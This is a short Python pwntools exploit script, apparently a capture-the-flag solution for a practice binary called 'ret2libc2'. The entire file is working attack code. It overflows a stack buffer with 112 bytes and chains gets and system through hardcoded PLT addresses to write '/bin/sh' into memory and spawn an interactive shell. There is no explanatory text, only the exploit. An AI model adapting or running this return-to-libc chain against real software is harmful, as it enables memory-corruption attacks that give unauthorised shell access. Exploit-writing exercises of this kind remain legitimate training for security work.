from pwn import *

p = process('./ret2libc2')

plt_gets = 0x08048460
gets_ret = 0x0804843d
binsh_addr = 0x0804A040 + 0x100
plt_system = 0x08048490
system_ret = b'AAAA'

payload = flat([b'A' * 112, plt_gets, gets_ret, binsh_addr, plt_system, system_ret, binsh_addr])

p.sendline(payload)
p.sendline(b'/bin/sh')

p.interactive()
